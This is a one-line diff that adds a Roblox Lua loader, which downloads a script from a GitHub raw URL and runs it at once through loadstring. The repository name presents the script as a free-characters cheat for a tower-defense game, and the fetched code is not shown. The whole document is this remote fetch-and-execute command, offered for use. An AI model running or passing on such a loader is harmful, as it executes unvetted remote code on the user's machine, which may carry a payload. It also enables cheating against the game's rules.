@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/flopa2677/Gold-Tower-Defense-500K-VISITS-EVENT-Free-characters-script/main/README.md"))()
